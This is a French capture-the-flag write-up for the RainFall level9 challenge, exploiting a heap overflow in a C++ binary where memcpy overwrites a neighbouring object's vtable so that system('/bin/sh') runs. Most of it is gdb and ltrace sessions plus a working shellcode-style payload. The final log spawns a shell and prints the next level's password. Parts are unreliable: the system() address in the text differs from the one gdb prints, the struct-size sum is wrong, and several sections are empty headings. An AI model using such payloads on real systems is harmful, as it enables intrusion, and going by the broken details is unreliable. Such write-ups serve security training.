# level9

## 0 - Test de l'éxécutable

```shell
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 fezfe
level9@RainFall:~$ ./level9 fezfe esrgser
level9@RainFall:~$ ./level9 fezfe esrgser qregserge
```

## 1 - Analyse du code source

```C
    // Définit l'annotation de obj1 avec argv[1]
    // VULNÉRABILITÉ: Si argv[1] est trop long, cela peut écraser la vtable de obj2
    // (si obj2 est alloué juste après obj1 en mémoire)
    N_setAnnotation(obj1, argv[1]);
    
    // Appelle la première fonction de la vtable de obj2
    // La vtable est à l'offset 0, donc obj2->vtable[0] est operator+
    // Signature: int (*)(int, int) où les int sont des pointeurs vers objets
    return obj2->vtable[0]((int)obj2, (int)obj1);
```

La fonction retourne la premiere fonction de la vtable de obj2, or obj1 et obj2 sont malloc l'un apres l'autre et la fonction N_setannotation remplace l'annotation de obj1 par la string que l'on fournit en argv[1], sans vérification

Cette fois, nous sommes face à un programme en C++ avec une méthode de classe utilisant memcpy(), qui est connue pour être exploitable puisqu’aucune vérification de dépassement ou de recouvrement n’est effectuée.

En y regardant de plus près, on s’aperçoit que ce programme appelle une adresse chargée en mémoire après l’appel d’une méthode de classe. En utilisant memcpy, on pourrait écraser cette adresse pour forcer le programme à appeler system() et ainsi ouvrir un shell.

Pour réaliser cet exploit, il nous faut :

    L’adresse de la fonction system() (0xb7d86060) - OK
    L’offset de la fonction memcpy() (108 octets) (obtenu en analysant la taille de la structure N -> 8 (pointeur **vtable) + 100 (char[100]) + 8 (int)) - OK
    L’adresse du registre eax au retour de la méthode (0x0804a00c)


## 2 - Récupération de l'adresse de la fonction system

```shell
# Create a function using system lib function
level9@RainFall:/tmp$ cat getsystem.c 
include <stdio.h>
include <stdlib.h>

int main(int argc, char** argv)
{
  system("/bin/sh");
  return (0);
}

# Compiler et lire la fonction avec gdb
level9@RainFall:/tmp$ cc getsystem.c 
level9@RainFall:/tmp$ gdb a.out 
[...]

(gdb) break main # Ajouter un breakpoint
Breakpoint 1 at 0x80483e7
(gdb) run # Run
Starting program: /tmp/a.out 

Breakpoint 1, 0x080483e7 in main ()
(gdb) print system # Imprimer les informations sur la fonction system()
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) 
```

## 3 - Récupération de l'adresse de 

```shell
level9@RainFall:~$ ltrace ./level9 "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
__libc_start_main(0x80485f4, 2, 0xbffff734, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                                                                     = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                                                                  = 0
_Znwj(108, 0xbffff734, 0xbffff740, 0xb7d79e55, 0xb7fed280)                                                                                                             = 0x804a008
_Znwj(108, 5, 0xbffff740, 0xb7d79e55, 0xb7fed280)                                                                                                                      = 0x804a078
strlen("aaaabaaacaaadaaaeaaafaaagaaahaaa"...)                                                                                                                          = 200
memcpy(0x0804a00c, "aaaabaaacaaadaaaeaaafaaagaaahaaa"..., 200)                                                                                                         = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level9@RainFall:~$
```

0x0804a00c est l'adresse de destination du memcpy() , soit l'adresse de l'annotation[100] de obj1

-----------------------------

## 3 - Récupération de l'adresse du shellcode


## 4 - Récupération de l'offset



## 5 - Mise en place de l'exploit


## 6 - Log terminal final

```shell
level9@RainFall:~$ ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
sh: 1: 
       : not found
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
`````



